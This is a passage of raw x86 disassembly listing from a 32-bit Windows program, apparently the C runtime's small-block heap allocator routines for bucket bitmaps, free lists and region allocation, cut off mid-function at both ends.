  4267fa:	mov    esi,DWORD PTR [ecx+0x8]
  4267fd:	mov    ecx,DWORD PTR [ecx+0x4]
  426800:	mov    DWORD PTR [esi+0x4],ecx
  426803:	mov    ecx,DWORD PTR [ebp+0xc]
  426806:	mov    esi,DWORD PTR [ecx+0x4]
  426809:	mov    ecx,DWORD PTR [ecx+0x8]
  42680c:	mov    DWORD PTR [esi+0x8],ecx
  42680f:	mov    esi,DWORD PTR [ebp+0xc]
  426812:	jmp    0x426817
  426814:	mov    ebx,DWORD PTR [ebp+0x8]
  426817:	cmp    DWORD PTR [ebp-0xc],0x0
  42681b:	jne    0x426825
  42681d:	cmp    ebx,edx
  42681f:	je     0x4268a5
  426825:	mov    ecx,DWORD PTR [ebp-0x10]
  426828:	lea    ecx,[ecx+edx*8]
  42682b:	mov    ebx,DWORD PTR [ecx+0x4]
  42682e:	mov    DWORD PTR [esi+0x8],ecx
  426831:	mov    DWORD PTR [esi+0x4],ebx
  426834:	mov    DWORD PTR [ecx+0x4],esi
  426837:	mov    ecx,DWORD PTR [esi+0x4]
  42683a:	mov    DWORD PTR [ecx+0x8],esi
  42683d:	mov    ecx,DWORD PTR [esi+0x4]
  426840:	cmp    ecx,DWORD PTR [esi+0x8]
  426843:	jne    0x4268a5
  426845:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426849:	mov    BYTE PTR [ebp+0xf],cl
  42684c:	inc    cl
  42684e:	cmp    edx,0x20
  426851:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426855:	jae    0x42687c
  426857:	cmp    BYTE PTR [ebp+0xf],0x0
  42685b:	jne    0x42686b
  42685d:	mov    ecx,edx
  42685f:	mov    ebx,0x80000000
  426864:	shr    ebx,cl
  426866:	mov    ecx,DWORD PTR [ebp+0x8]
  426869:	or     DWORD PTR [ecx],ebx
  42686b:	mov    ebx,0x80000000
  426870:	mov    ecx,edx
  426872:	shr    ebx,cl
  426874:	lea    eax,[eax+edi*4+0x44]
  426878:	or     DWORD PTR [eax],ebx
  42687a:	jmp    0x4268a5
  42687c:	cmp    BYTE PTR [ebp+0xf],0x0
  426880:	jne    0x426892
  426882:	lea    ecx,[edx-0x20]
  426885:	mov    ebx,0x80000000
  42688a:	shr    ebx,cl
  42688c:	mov    ecx,DWORD PTR [ebp+0x8]
  42688f:	or     DWORD PTR [ecx+0x4],ebx
  426892:	lea    ecx,[edx-0x20]
  426895:	mov    edx,0x80000000
  42689a:	shr    edx,cl
  42689c:	lea    eax,[eax+edi*4+0xc4]
  4268a3:	or     DWORD PTR [eax],edx
  4268a5:	mov    eax,DWORD PTR [ebp-0x4]
  4268a8:	mov    DWORD PTR [esi],eax
  4268aa:	mov    DWORD PTR [eax+esi*1-0x4],eax
  4268ae:	mov    eax,DWORD PTR [ebp-0x10]
  4268b1:	dec    DWORD PTR [eax]
  4268b3:	jne    0x4269b0
  4268b9:	mov    eax,ds:0x4674b8
  4268be:	test   eax,eax
  4268c0:	je     0x4269a2
  4268c6:	mov    ecx,DWORD PTR ds:0x4674d0
  4268cc:	mov    esi,DWORD PTR ds:0x42904c
  4268d2:	push   0x4000
  4268d7:	shl    ecx,0xf
  4268da:	add    ecx,DWORD PTR [eax+0xc]
  4268dd:	mov    ebx,0x8000
  4268e2:	push   ebx
  4268e3:	push   ecx
  4268e4:	call   esi
  4268e6:	mov    ecx,DWORD PTR ds:0x4674d0
  4268ec:	mov    eax,ds:0x4674b8
  4268f1:	mov    edx,0x80000000
  4268f6:	shr    edx,cl
  4268f8:	or     DWORD PTR [eax+0x8],edx
  4268fb:	mov    eax,ds:0x4674b8
  426900:	mov    eax,DWORD PTR [eax+0x10]
  426903:	mov    ecx,DWORD PTR ds:0x4674d0
  426909:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  426911:	mov    eax,ds:0x4674b8
  426916:	mov    eax,DWORD PTR [eax+0x10]
  426919:	dec    BYTE PTR [eax+0x43]
  42691c:	mov    eax,ds:0x4674b8
  426921:	mov    ecx,DWORD PTR [eax+0x10]
  426924:	cmp    BYTE PTR [ecx+0x43],0x0
  426928:	jne    0x426933
  42692a:	and    DWORD PTR [eax+0x4],0xfffffffe
  42692e:	mov    eax,ds:0x4674b8
  426933:	cmp    DWORD PTR [eax+0x8],0xffffffff
  426937:	jne    0x4269a2
  426939:	push   ebx
  42693a:	push   0x0
  42693c:	push   DWORD PTR [eax+0xc]
  42693f:	call   esi
  426941:	mov    eax,ds:0x4674b8
  426946:	push   DWORD PTR [eax+0x10]
  426949:	push   0x0
  42694b:	push   DWORD PTR ds:0x467700
  426951:	call   DWORD PTR ds:0x429058
  426957:	mov    eax,ds:0x4674bc
  42695c:	mov    edx,DWORD PTR ds:0x4674c0
  426962:	lea    eax,[eax+eax*4]
  426965:	shl    eax,0x2
  426968:	mov    ecx,eax
  42696a:	mov    eax,ds:0x4674b8
  42696f:	sub    ecx,eax
  426971:	lea    ecx,[ecx+edx*1-0x14]
  426975:	push   ecx
  426976:	lea    ecx,[eax+0x14]
  426979:	push   ecx
  42697a:	push   eax
  42697b:	call   0x4281d0
  426980:	mov    eax,DWORD PTR [ebp+0x8]
  426983:	add    esp,0xc
  426986:	dec    DWORD PTR ds:0x4674bc
  42698c:	cmp    eax,DWORD PTR ds:0x4674b8
  426992:	jbe    0x426998
  426994:	sub    DWORD PTR [ebp+0x8],0x14
  426998:	mov    eax,ds:0x4674c0
  42699d:	mov    ds:0x4674c8,eax
  4269a2:	mov    eax,DWORD PTR [ebp+0x8]
  4269a5:	mov    ds:0x4674b8,eax
  4269aa:	mov    DWORD PTR ds:0x4674d0,edi
  4269b0:	pop    ebx
  4269b1:	pop    edi
  4269b2:	pop    esi
  4269b3:	leave  
  4269b4:	ret    
  4269b5:	mov    eax,ds:0x4674bc
  4269ba:	mov    ecx,DWORD PTR ds:0x4674cc
  4269c0:	push   edi
  4269c1:	xor    edi,edi
  4269c3:	cmp    eax,ecx
  4269c5:	jne    0x4269fb
  4269c7:	lea    eax,[ecx+ecx*4+0x50]
  4269cb:	shl    eax,0x2
  4269ce:	push   eax
  4269cf:	push   DWORD PTR ds:0x4674c0
  4269d5:	push   edi
  4269d6:	push   DWORD PTR ds:0x467700
  4269dc:	call   DWORD PTR ds:0x4290e8
  4269e2:	cmp    eax,edi
  4269e4:	jne    0x4269ea
  4269e6:	xor    eax,eax
  4269e8:	pop    edi
  4269e9:	ret    
  4269ea:	add    DWORD PTR ds:0x4674cc,0x10
  4269f1:	mov    ds:0x4674c0,eax
  4269f6:	mov    eax,ds:0x4674bc
  4269fb:	mov    ecx,DWORD PTR ds:0x4674c0
  426a01:	push   esi
  426a02:	push   0x41c4
  426a07:	push   0x8
  426a09:	push   DWORD PTR ds:0x467700
  426a0f:	lea    eax,[eax+eax*4]
  426a12:	lea    esi,[ecx+eax*4]
  426a15:	call   DWORD PTR ds:0x4290dc
  426a1b:	cmp    eax,edi
  426a1d:	mov    DWORD PTR [esi+0x10],eax
  426a20:	jne    0x426a26
  426a22:	xor    eax,eax
  426a24:	jmp    0x426a69
  426a26:	push   0x4
  426a28:	push   0x2000
  426a2d:	push   0x100000
  426a32:	push   edi
  426a33:	call   DWORD PTR ds:0x4290e4
  426a39:	cmp    eax,edi
  426a3b:	mov    DWORD PTR [esi+0xc],eax
  426a3e:	jne    0x426a52
  426a40:	push   DWORD PTR [esi+0x10]
  426a43:	push   edi
  426a44:	push   DWORD PTR ds:0x467700
  426a4a:	call   DWORD PTR ds:0x429058
  426a50:	jmp    0x426a22
  426a52:	or     DWORD PTR [esi+0x8],0xffffffff
  426a56:	mov    DWORD PTR [esi],edi
  426a58:	mov    DWORD PTR [esi+0x4],edi
  426a5b:	inc    DWORD PTR ds:0x4674bc
  426a61:	mov    eax,DWORD PTR [esi+0x10]
  426a64:	or     DWORD PTR [eax],0xffffffff
  426a67:	mov    eax,esi
  426a69:	pop    esi
  426a6a:	pop    edi
  426a6b:	ret    
  426a6c:	push   ebp
  426a6d:	mov    ebp,esp
  426a6f:	push   ecx
  426a70:	push   ecx
  426a71:	mov    ecx,DWORD PTR [ebp+0x8]
  426a74:	mov    eax,DWORD PTR [ecx+0x8]
  426a77:	push   ebx
  426a78:	push   esi
  426a79:	mov    esi,DWORD PTR [ecx+0x10]
  426a7c:	push   edi
  426a7d:	xor    ebx,ebx
  426a7f:	jmp    0x426a84
  426a81:	shl    eax,1
  426a83:	inc    ebx
  426a84:	test   eax,eax
  426a86:	jge    0x426a81
  426a88:	mov    eax,ebx
  426a8a:	imul   eax,eax,0x204
  426a90:	lea    eax,[eax+esi*1+0x144]
  426a97:	push   0x3f
  426a99:	mov    DWORD PTR [ebp-0x8],eax
  426a9c:	pop    edx
  426a9d:	mov    DWORD PTR [eax+0x8],eax
  426aa0:	mov    DWORD PTR [eax+0x4],eax
  426aa3:	add    eax,0x8
  426aa6:	dec    edx
  426aa7:	jne    0x426a9d
  426aa9:	push   0x4
  426aab:	mov    edi,ebx
  426aad:	push   0x1000
  426ab2:	shl    edi,0xf
  426ab5:	add    edi,DWORD PTR [ecx+0xc]
  426ab8:	push   0x8000
  426abd:	push   edi
  426abe:	call   DWORD PTR ds:0x4290e4
  426ac4:	test   eax,eax
  426ac6:	jne    0x426ad0
  426ac8:	or     eax,0xffffffff
  426acb:	jmp    0x426b6d
  426ad0:	lea    edx,[edi+0x7000]
  426ad6:	cmp    edi,edx
  426ad8:	mov    DWORD PTR [ebp-0x4],edx
  426adb:	ja     0x426b20
  426add:	mov    ecx,edx
  426adf:	sub    ecx,edi
  426ae1:	shr    ecx,0xc
  426ae4:	lea    eax,[edi+0x10]
  426ae7:	inc    ecx
  426ae8:	or     DWORD PTR [eax-0x8],0xffffffff
  426aec:	or     DWORD PTR [eax+0xfec],0xffffffff
  426af3:	lea    edx,[eax+0xffc]
  426af9:	mov    DWORD PTR [eax],edx
  426afb:	lea    edx,[eax-0x1004]
  426b01:	mov    DWORD PTR [eax-0x4],0xff0
  426b08:	mov    DWORD PTR [eax+0x4],edx
  426b0b:	mov    DWORD PTR [eax+0xfe8],0xff0
  426b15:	add    eax,0x1000
  426b1a:	dec    ecx
  426b1b:	jne    0x426ae8
  426b1d:	mov    edx,DWORD PTR [ebp-0x4]
  426b20:	mov    eax,DWORD PTR [ebp-0x8]
  426b23:	add    eax,0x1f8
  426b28:	lea    ecx,[edi+0xc]
  426b2b:	mov    DWORD PTR [eax+0x4],ecx
  426b2e:	mov    DWORD PTR [ecx+0x8],eax
  426b31:	lea    ecx,[edx+0xc]
  426b34:	mov    DWORD PTR [eax+0x8],ecx
  426b37:	mov    DWORD PTR [ecx+0x4],eax
  426b3a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426b3f:	xor    edi,edi
  426b41:	inc    edi
  426b42:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426b49:	mov    al,BYTE PTR [esi+0x43]
  426b4c:	mov    cl,al
  426b4e:	inc    cl
  426b50:	test   al,al
  426b52:	mov    eax,DWORD PTR [ebp+0x8]
  426b55:	mov    BYTE PTR [esi+0x43],cl
  426b58:	jne    0x426b5d
  426b5a:	or     DWORD PTR [eax+0x4],edi
  426b5d:	mov    edx,0x80000000
  426b62:	mov    ecx,ebx
  426b64:	shr    edx,cl
  426b66:	not    edx
  426b68:	and    DWORD PTR [eax+0x8],edx
  426b6b:	mov    eax,ebx
  426b6d:	pop    edi
  426b6e:	pop    esi
  426b6f:	pop    ebx
  426b70:	leave  
  426b71:	ret    
  426b72:	push   ebp
  426b73:	mov    ebp,esp
  426b75:	sub    esp,0xc
  426b78:	mov    ecx,DWORD PTR [ebp+0x8]
  426b7b:	mov    eax,DWORD PTR [ecx+0x10]
  426b7e:	push   ebx
  426b7f:	push   esi
  426b80:	mov    esi,DWORD PTR [ebp+0x10]
  426b83:	push   edi
  426b84:	mov    edi,DWORD PTR [ebp+0xc]
  426b87:	mov    edx,edi
  426b89:	sub    edx,DWORD PTR [ecx+0xc]
  426b8c:	add    esi,0x17
  426b8f:	shr    edx,0xf
  426b92:	mov    ecx,edx
  426b94:	imul   ecx,ecx,0x204
  426b9a:	lea    ecx,[ecx+eax*1+0x144]
  426ba1:	mov    DWORD PTR [ebp-0xc],ecx
  426ba4:	mov    ecx,DWORD PTR [edi-0x4]
  426ba7:	and    esi,0xfffffff0
  426baa:	dec    ecx
  426bab:	cmp    esi,ecx
  426bad:	lea    edi,[ecx+edi*1-0x4]
  426bb1:	mov    ebx,DWORD PTR [edi]
  426bb3:	mov    DWORD PTR [ebp+0x10],ecx
  426bb6:	mov    DWORD PTR [ebp-0x4],ebx
  426bb9:	jle    0x426d14
  426bbf:	test   bl,0x1
  426bc2:	jne    0x426d0d
  426bc8:	add    ebx,ecx
  426bca:	cmp    esi,ebx
  426bcc:	jg     0x426d0d
  426bd2:	mov    ecx,DWORD PTR [ebp-0x4]
  426bd5:	sar    ecx,0x4
  426bd8:	dec    ecx
  426bd9:	cmp    ecx,0x3f
  426bdc:	mov    DWORD PTR [ebp-0x8],ecx
  426bdf:	jbe    0x426be7
  426be1:	push   0x3f
  426be3:	pop    ecx
  426be4:	mov    DWORD PTR [ebp-0x8],ecx
  426be7:	mov    ebx,DWORD PTR [edi+0x4]
  426bea:	cmp    ebx,DWORD PTR [edi+0x8]
  426bed:	jne    0x426c32
  426bef:	cmp    ecx,0x20
  426bf2:	mov    ebx,0x80000000
  426bf7:	jae    0x426c13
  426bf9:	shr    ebx,cl
  426bfb:	mov    ecx,DWORD PTR [ebp-0x8]
  426bfe:	lea    ecx,[ecx+eax*1+0x4]
  426c02:	not    ebx
  426c04:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426c08:	dec    BYTE PTR [ecx]
  426c0a:	jne    0x426c32
  426c0c:	mov    ecx,DWORD PTR [ebp+0x8]
  426c0f:	and    DWORD PTR [ecx],ebx
  426c11:	jmp    0x426c32
  426c13:	add    ecx,0xffffffe0
  426c16:	shr    ebx,cl
  426c18:	mov    ecx,DWORD PTR [ebp-0x8]
  426c1b:	lea    ecx,[ecx+eax*1+0x4]
  426c1f:	not    ebx
  426c21:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426c28:	dec    BYTE PTR [ecx]
  426c2a:	jne    0x426c32
  426c2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426c2f:	and    DWORD PTR [ecx+0x4],ebx
  426c32:	mov    ecx,DWORD PTR [edi+0x8]
  426c35:	mov    ebx,DWORD PTR [edi+0x4]
  426c38:	mov    DWORD PTR [ecx+0x4],ebx
  426c3b:	mov    ecx,DWORD PTR [edi+0x4]
  426c3e:	mov    edi,DWORD PTR [edi+0x8]
  426c41:	mov    DWORD PTR [ecx+0x8],edi
  426c44:	mov    ecx,DWORD PTR [ebp+0x10]
  426c47:	sub    ecx,esi
  426c49:	add    DWORD PTR [ebp-0x4],ecx
  426c4c:	cmp    DWORD PTR [ebp-0x4],0x0
  426c50:	jle    0x426cfb
  426c56:	mov    edi,DWORD PTR [ebp-0x4]
  426c59:	mov    ecx,DWORD PTR [ebp+0xc]
  426c5c:	sar    edi,0x4
  426c5f:	dec    edi
  426c60:	cmp    edi,0x3f
  426c63:	lea    ecx,[ecx+esi*1-0x4]
  426c67:	jbe    0x426c6c
  426c69:	push   0x3f
  426c6b:	pop    edi
  426c6c:	mov    ebx,DWORD PTR [ebp-0xc]
  426c6f:	lea    ebx,[ebx+edi*8]
  426c72:	mov    DWORD PTR [ebp+0x10],ebx
  426c75:	mov    ebx,DWORD PTR [ebx+0x4]
  426c78:	mov    DWORD PTR [ecx+0x4],ebx
  426c7b:	mov    ebx,DWORD PTR [ebp+0x10]
  426c7e:	mov    DWORD PTR [ecx+0x8],ebx
  426c81:	mov    DWORD PTR [ebx+0x4],ecx
  426c84:	mov    ebx,DWORD PTR [ecx+0x4]
  426c87:	mov    DWORD PTR [ebx+0x8],ecx
  426c8a:	mov    ebx,DWORD PTR [ecx+0x4]
  426c8d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426c90:	jne    0x426ce9
  426c92:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426c96:	mov    BYTE PTR [ebp+0x13],cl
  426c99:	inc    cl
  426c9b:	cmp    edi,0x20
  426c9e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426ca2:	jae    0x426cc0
  426ca4:	cmp    BYTE PTR [ebp+0x13],0x0
  426ca8:	jne    0x426cb8
  426caa:	mov    ecx,edi
  426cac:	mov    ebx,0x80000000
  426cb1:	shr    ebx,cl
  426cb3:	mov    ecx,DWORD PTR [ebp+0x8]
  426cb6:	or     DWORD PTR [ecx],ebx
  426cb8:	lea    eax,[eax+edx*4+0x44]
  426cbc:	mov    ecx,edi
  426cbe:	jmp    0x426ce0
  426cc0:	cmp    BYTE PTR [ebp+0x13],0x0
  426cc4:	jne    0x426cd6
  426cc6:	lea    ecx,[edi-0x20]
  426cc9:	mov    ebx,0x80000000
  426cce:	shr    ebx,cl
  426cd0:	mov    ecx,DWORD PTR [ebp+0x8]
  426cd3:	or     DWORD PTR [ecx+0x4],ebx
  426cd6:	lea    eax,[eax+edx*4+0xc4]
  426cdd:	lea    ecx,[edi-0x20]
  426ce0:	mov    edx,0x80000000
  426ce5:	shr    edx,cl
  426ce7:	or     DWORD PTR [eax],edx
  426ce9:	mov    edx,DWORD PTR [ebp+0xc]
  426cec:	mov    ecx,DWORD PTR [ebp-0x4]
  426cef:	lea    eax,[edx+esi*1-0x4]
  426cf3:	mov    DWORD PTR [eax],ecx
  426cf5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426cf9:	jmp    0x426cfe
  426cfb:	mov    edx,DWORD PTR [ebp+0xc]
  426cfe:	lea    eax,[esi+0x1]
  426d01:	mov    DWORD PTR [edx-0x4],eax
  426d04:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426d08:	jmp    0x426e49
  426d0d:	xor    eax,eax
  426d0f:	jmp    0x426e4c
  426d14:	jge    0x426e49
  426d1a:	mov    ebx,DWORD PTR [ebp+0xc]
  426d1d:	sub    DWORD PTR [ebp+0x10],esi
  426d20:	lea    ecx,[esi+0x1]
  426d23:	mov    DWORD PTR [ebx-0x4],ecx
  426d26:	lea    ebx,[ebx+esi*1-0x4]
  426d2a:	mov    esi,DWORD PTR [ebp+0x10]
  426d2d:	sar    esi,0x4
  426d30:	dec    esi
  426d31:	cmp    esi,0x3f
  426d34:	mov    DWORD PTR [ebp+0xc],ebx
  426d37:	mov    DWORD PTR [ebx-0x4],ecx
  426d3a:	jbe    0x426d3f
  426d3c:	push   0x3f
  426d3e:	pop    esi
  426d3f:	test   BYTE PTR [ebp-0x4],0x1
  426d43:	jne    0x426dc9
  426d49:	mov    esi,DWORD PTR [ebp-0x4]
  426d4c:	sar    esi,0x4
  426d4f:	dec    esi
  426d50:	cmp    esi,0x3f
  426d53:	jbe    0x426d58
  426d55:	push   0x3f
  426d57:	pop    esi
  426d58:	mov    ecx,DWORD PTR [edi+0x4]
  426d5b:	cmp    ecx,DWORD PTR [edi+0x8]
  426d5e:	jne    0x426da2
  426d60:	cmp    esi,0x20
  426d63:	mov    ebx,0x80000000
  426d68:	jae    0x426d83
  426d6a:	mov    ecx,esi
  426d6c:	shr    ebx,cl
  426d6e:	lea    esi,[esi+eax*1+0x4]
  426d72:	not    ebx
  426d74:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426d78:	dec    BYTE PTR [esi]
  426d7a:	jne    0x426d9f
  426d7c:	mov    ecx,DWORD PTR [ebp+0x8]
  426d7f:	and    DWORD PTR [ecx],ebx
  426d81:	jmp    0x426d9f
  426d83:	lea    ecx,[esi-0x20]
  426d86:	shr    ebx,cl
  426d88:	lea    ecx,[esi+eax*1+0x4]
  426d8c:	not    ebx
  426d8e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426d95:	dec    BYTE PTR [ecx]
  426d97:	jne    0x426d9f
  426d99:	mov    ecx,DWORD PTR [ebp+0x8]
  426d9c:	and    DWORD PTR [ecx+0x4],ebx
  426d9f:	mov    ebx,DWORD PTR [ebp+0xc]
  426da2:	mov    ecx,DWORD PTR [edi+0x8]
  426da5:	mov    esi,DWORD PTR [edi+0x4]
  426da8:	mov    DWORD PTR [ecx+0x4],esi
  426dab:	mov    esi,DWORD PTR [edi+0x8]
  426dae:	mov    ecx,DWORD PTR [edi+0x4]
  426db1:	mov    DWORD PTR [ecx+0x8],esi
  426db4:	mov    esi,DWORD PTR [ebp+0x10]
  426db7:	add    esi,DWORD PTR [ebp-0x4]
  426dba:	mov    DWORD PTR [ebp+0x10],esi
  426dbd:	sar    esi,0x4
  426dc0:	dec    esi
  426dc1:	cmp    esi,0x3f
  426dc4:	jbe    0x426dc9
  426dc6:	push   0x3f
  426dc8:	pop    esi
  426dc9:	mov    ecx,DWORD PTR [ebp-0xc]
  426dcc:	lea    ecx,[ecx+esi*8]
  426dcf:	mov    edi,DWORD PTR [ecx+0x4]
  426dd2:	mov    DWORD PTR [ebx+0x8],ecx
  426dd5:	mov    DWORD PTR [ebx+0x4],edi
  426dd8:	mov    DWORD PTR [ecx+0x4],ebx
  426ddb:	mov    ecx,DWORD PTR [ebx+0x4]
  426dde:	mov    DWORD PTR [ecx+0x8],ebx
  426de1:	mov    ecx,DWORD PTR [ebx+0x4]
  426de4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426de7:	jne    0x426e40
  426de9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ded:	mov    BYTE PTR [ebp+0xf],cl
  426df0:	inc    cl
  426df2:	cmp    esi,0x20
  426df5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426df9:	jae    0x426e17
  426dfb:	cmp    BYTE PTR [ebp+0xf],0x0
  426dff:	jne    0x426e0f
  426e01:	mov    ecx,esi
  426e03:	mov    edi,0x80000000
  426e08:	shr    edi,cl
  426e0a:	mov    ecx,DWORD PTR [ebp+0x8]
  426e0d:	or     DWORD PTR [ecx],edi
  426e0f:	lea    eax,[eax+edx*4+0x44]
  426e13:	mov    ecx,esi
  426e15:	jmp    0x426e37
  426e17:	cmp    BYTE PTR [ebp+0xf],0x0
  426e1b:	jne    0x426e2d
  426e1d:	lea    ecx,[esi-0x20]
  426e20:	mov    edi,0x80000000
  426e25:	shr    edi,cl
  426e27:	mov    ecx,DWORD PTR [ebp+0x8]
  426e2a:	or     DWORD PTR [ecx+0x4],edi
  426e2d:	lea    eax,[eax+edx*4+0xc4]
  426e34:	lea    ecx,[esi-0x20]
  426e37:	mov    edx,0x80000000
  426e3c:	shr    edx,cl
  426e3e:	or     DWORD PTR [eax],edx
  426e40:	mov    eax,DWORD PTR [ebp+0x10]
  426e43:	mov    DWORD PTR [ebx],eax
  426e45:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426e49:	xor    eax,eax
  426e4b:	inc    eax
  426e4c:	pop    edi
  426e4d:	pop    esi
  426e4e:	pop    ebx
  426e4f:	leave  
  426e50:	ret    
  426e51:	push   ebp
  426e52:	mov    ebp,esp
  426e54:	sub    esp,0x14
  426e57:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5a:	mov    eax,ds:0x4674bc
  426e5f:	mov    edx,DWORD PTR ds:0x4674c0
  426e65:	add    ecx,0x17
  426e68:	and    ecx,0xfffffff0
  426e6b:	push   ebx
  426e6c:	mov    DWORD PTR [ebp-0x10],ecx
  426e6f:	sar    ecx,0x4
  426e72:	push   esi
  426e73:	lea    eax,[eax+eax*4]
  426e76:	push   edi
  426e77:	dec    ecx
  426e78:	cmp    ecx,0x20
  426e7b:	lea    edi,[edx+eax*4]
  426e7e:	mov    DWORD PTR [ebp-0x4],edi
  426e81:	jge    0x426e8e
  426e83:	or     esi,0xffffffff
  426e86:	shr    esi,cl
  426e88:	or     DWORD PTR [ebp-0x8],0xffffffff
  426e8c:	jmp    0x426e9b
  426e8e:	add    ecx,0xffffffe0
  426e91:	or     eax,0xffffffff
  426e94:	xor    esi,esi
  426e96:	shr    eax,cl
  426e98:	mov    DWORD PTR [ebp-0x8],eax
  426e9b:	mov    eax,ds:0x4674c8
  426ea0:	mov    ebx,eax
  426ea2:	mov    DWORD PTR [ebp-0xc],esi
  426ea5:	cmp    ebx,edi
  426ea7:	jmp    0x426ebd
  426ea9:	mov    ecx,DWORD PTR [ebx+0x4]
  426eac:	mov    edi,DWORD PTR [ebx]
  426eae:	and    ecx,DWORD PTR [ebp-0x8]
  426eb1:	and    edi,esi
  426eb3:	or     ecx,edi
  426eb5:	jne    0x426ec2
  426eb7:	add    ebx,0x14
  426eba:	cmp    ebx,DWORD PTR [ebp-0x4]
  426ebd:	mov    DWORD PTR [ebp+0x8],ebx
  426ec0:	jb     0x426ea9
  426ec2:	cmp    ebx,DWORD PTR [ebp-0x4]
  426ec5:	jne    0x426eeb
  426ec7:	mov    ebx,edx
  426ec9:	jmp    0x426edc
  426ecb:	mov    ecx,DWORD PTR [ebx+0x4]
  426ece:	mov    edi,DWORD PTR [ebx]
  426ed0:	and    ecx,DWORD PTR [ebp-0x8]
  426ed3:	and    edi,esi
  426ed5:	or     ecx,edi
  426ed7:	jne    0x426ee3
  426ed9:	add    ebx,0x14
  426edc:	cmp    ebx,eax
  426ede:	mov    DWORD PTR [ebp+0x8],ebx
  426ee1:	jb     0x426ecb
  426ee3:	cmp    ebx,eax
  426ee5:	je     0x426f7f
  426eeb:	mov    DWORD PTR ds:0x4674c8,ebx
  426ef1:	mov    eax,DWORD PTR [ebx+0x10]
  426ef4:	mov    edx,DWORD PTR [eax]
  426ef6:	cmp    edx,0xffffffff
  426ef9:	mov    DWORD PTR [ebp-0x4],edx
  426efc:	je     0x426f12
  426efe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426f05:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426f09:	and    ecx,DWORD PTR [ebp-0x8]
  426f0c:	and    edi,esi
  426f0e:	or     ecx,edi
  426f10:	jne    0x426f48
  426f12:	mov    edx,DWORD PTR [eax+0xc4]
  426f18:	and    edx,DWORD PTR [ebp-0x8]
  426f1b:	and    DWORD PTR [ebp-0x4],0x0
  426f1f:	lea    ecx,[eax+0x44]
  426f22:	mov    esi,DWORD PTR [ecx]
  426f24:	and    esi,DWORD PTR [ebp-0xc]
  426f27:	or     edx,esi
  426f29:	mov    esi,DWORD PTR [ebp-0xc]
  426f2c:	jne    0x426f45
  426f2e:	mov    edx,DWORD PTR [ecx+0x84]
  426f34:	and    edx,DWORD PTR [ebp-0x8]
  426f37:	inc    DWORD PTR [ebp-0x4]
  426f3a:	add    ecx,0x4
  426f3d:	mov    edi,DWORD PTR [ecx]
  426f3f:	and    edi,esi
  426f41:	or     edx,edi
  426f43:	je     0x426f2e
  426f45:	mov    edx,DWORD PTR [ebp-0x4]
  426f48:	mov    ecx,edx
  426f4a:	imul   ecx,ecx,0x204
  426f50:	lea    ecx,[ecx+eax*1+0x144]
  426f57:	mov    DWORD PTR [ebp-0xc],ecx
  426f5a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  426f5e:	xor    edi,edi
  426f60:	and    ecx,esi
  426f62:	jne    0x426fd1
  426f64:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426f6b:	and    ecx,DWORD PTR [ebp-0x8]
  426f6e:	push   0x20
  426f70:	pop    edi
  426f71:	jmp    0x426fd1
  426f73:	cmp    DWORD PTR [ebx+0x8],0x0
  426f77:	jne    0x426f84
  426f79:	add    ebx,0x14
  426f7c:	mov    DWORD PTR [ebp+0x8],ebx
  426f7f:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f82:	jb     0x426f73
  426f84:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f87:	jne    0x426faf
  426f89:	mov    ebx,edx
  426f8b:	jmp    0x426f96
  426f8d:	cmp    DWORD PTR [ebx+0x8],0x0
  426f91:	jne    0x426f9d
  426f93:	add    ebx,0x14
  426f96:	cmp    ebx,eax
  426f98:	mov    DWORD PTR [ebp+0x8],ebx
  426f9b:	jb     0x426f8d
  426f9d:	cmp    ebx,eax
  426f9f:	jne    0x426faf
  426fa1:	call   0x4269b5
  426fa6:	mov    ebx,eax
  426fa8:	test   ebx,ebx
  426faa:	mov    DWORD PTR [ebp+0x8],ebx
  426fad:	je     0x426fc7
  426faf:	push   ebx
  426fb0:	call   0x426a6c
  426fb5:	pop    ecx
  426fb6:	mov    ecx,DWORD PTR [ebx+0x10]
  426fb9:	mov    DWORD PTR [ecx],eax
  426fbb:	mov    eax,DWORD PTR [ebx+0x10]
  426fbe:	cmp    DWORD PTR [eax],0xffffffff
  426fc1:	jne    0x426eeb
  426fc7:	xor    eax,eax
  426fc9:	jmp    0x427148
  426fce:	shl    ecx,1
  426fd0:	inc    edi
  426fd1:	test   ecx,ecx
  426fd3:	jge    0x426fce
  426fd5:	mov    ecx,DWORD PTR [ebp-0xc]
  426fd8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  426fdc:	mov    ecx,DWORD PTR [edx]
  426fde:	sub    ecx,DWORD PTR [ebp-0x10]
  426fe1:	mov    esi,ecx
  426fe3:	sar    esi,0x4
  426fe6:	dec    esi
  426fe7:	cmp    esi,0x3f
  426fea:	mov    DWORD PTR [ebp-0x8],ecx
  426fed:	jle    0x426ff2
  426fef:	push   0x3f
  426ff1:	pop    esi
  426ff2:	cmp    esi,edi
  426ff4:	je     0x4270fb
  426ffa:	mov    ecx,DWORD PTR [edx+0x4]
  426ffd:	cmp    ecx,DWORD PTR [edx+0x8]
  427000:	jne    0x42705e
  427002:	cmp    edi,0x20
  427005:	mov    ebx,0x80000000
  42700a:	jge    0x427032
  42700c:	mov    ecx,edi
  42700e:	shr    ebx,cl
  427010:	mov    ecx,DWORD PTR [ebp-0x4]
